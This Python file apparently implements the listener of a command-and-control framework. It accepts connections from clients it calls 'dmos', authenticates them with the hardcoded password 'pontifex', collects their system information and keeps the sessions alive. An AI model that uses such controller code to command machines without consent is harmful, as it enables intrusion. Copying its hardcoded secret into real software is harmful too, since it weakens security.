import sys, os, time
import socket, json
from lib.helper import *
from lib.debug import Debug, log
from lib.dmos import Dmos

class TCPServer():
    def __init__(self, ANODE, APORT, control):
        self.control = control
        self.ANODE = ANODE
        self.APORT = APORT
        self.PASS  = "pontifex"
        self.modules = self.load_modules("modules")
        self.interactive = False
        self.keepAliveSleepInterval = 5
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def load_modules(self, path):
        sys.path.append(path)
        modules = {}
        for mod in os.listdir(path):
            if mod == '__init__.py' or mod[-3:] != '.py':
                continue
            else:
                m = __import__(mod[:-3]).module()
                modules[m.Command] = m
        return modules

    def terminate_dmos(self, dmoss, dmos, signal=None):
        dmos.conn.close()
        dmos.online = False
        dmoss.pop(dmos.md5_hash, None)
        signals = ["gracefully", "error"]
        if signal == signals[0]:
            Debug.sprint("Connection with dmos {} terminated by the Pontifex".format(dmos.md5_hash), ANODE=self.ANODE, APORT=self.APORT)
        elif signal == signals[1]:
            Debug.sprint("Connection with dmos {} has been broken".format(dmos.md5_hash), ANODE=self.ANODE, APORT=self.APORT, thread=True)


    @safe_exec
    def listener(self):
        self.s.bind((self.ANODE, self.APORT))
        self.s.listen(5)

    def accept_conn(self):
        conn, address = self.s.accept()
        #log.debug("Initializing connection from " + address[0])
        if conn.recv(36).decode() == self.PASS:
            intel = conn.recv(1024).decode()
            intel = json.loads(intel)
        
            return Dmos(intel["basic"], intel["sysinfo"], address[0], conn, self)

    @safe_exec
    def keepAlive(self):
        while 1:
            time.sleep(self.keepAliveSleepInterval)
            for _, hash in enumerate(self.control.dmoss.copy()):
                try:
                    self.control.dmoss[hash].conn.send(b" ")
                except:
                    self.terminate_dmos(self.control.dmoss, self.control.dmoss[hash], signal="error")
